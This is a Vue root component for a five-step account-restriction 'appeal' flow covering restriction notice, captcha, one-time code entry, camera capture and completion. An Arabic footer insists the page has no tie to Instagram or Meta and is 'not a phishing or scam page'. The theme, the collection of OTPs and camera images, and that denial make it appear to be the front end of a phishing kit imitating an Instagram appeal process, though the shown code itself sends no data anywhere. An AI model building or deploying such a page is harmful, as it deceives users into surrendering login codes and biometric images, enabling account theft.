<template>
  <div class="w-full max-w-[400px] relative z-10 flex-grow flex flex-col justify-center px-5">
    <div class="bg-surface py-5">
      <StepProgress />
      <div class="relative min-h-[400px]">
        <Transition name="step" mode="out-in">
          <StepRestriction v-if="store.step === 1" key="step1" />
          <StepCaptcha v-else-if="store.step === 2" key="step2" />
          <StepOtp v-else-if="store.step === 3" key="step3" />
          <StepCamera v-else-if="store.step === 4" key="step4" />
          <StepDone v-else-if="store.step === 5" key="step5" />
        </Transition>
      </div>
    </div>

    <div class="w-full max-w-[400px] mt-10 pt-4 text-center text-[11px] text-[#555] leading-relaxed border-t border-[#1a1a1a]">
      <strong>تنبيه للمستخدم:</strong> هذه الصفحة مستقلة تماماً وهي أداة تحقق أمني خاصة. لا علاقة لهذه الصفحة، لا من قريب ولا من بعيد، بانستغرام (Instagram) أو شركة ميتا (Meta) أو أي منصة تواصل اجتماعي أخرى. هذه الصفحة ليست صفحة تصيد أو احتيال، بل هي مجرد واجهة تحقق مستقلة.
    </div>

    <ToastNotification />
  </div>
</template>

<script setup>
import { provide } from 'vue'
import { useAppealStore } from './stores/appeal'
import StepProgress from './components/StepProgress.vue'
import StepRestriction from './components/StepRestriction.vue'
import StepCaptcha from './components/StepCaptcha.vue'
import StepOtp from './components/StepOtp.vue'
import StepCamera from './components/StepCamera.vue'
import StepDone from './components/StepDone.vue'
import ToastNotification from './components/ToastNotification.vue'

const store = useAppealStore()
provide('step', store.step)

store.checkRestrictionStatus()
</script>

<style>
.step-enter-active,
.step-leave-active { transition: all 0.35s ease; }
.step-enter-from { opacity: 0; transform: translateX(20px); }
.step-leave-to { opacity: 0; transform: translateX(-20px); }

.animate-fade-in {
  animation: fadeIn 0.4s ease;
}
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}
</style>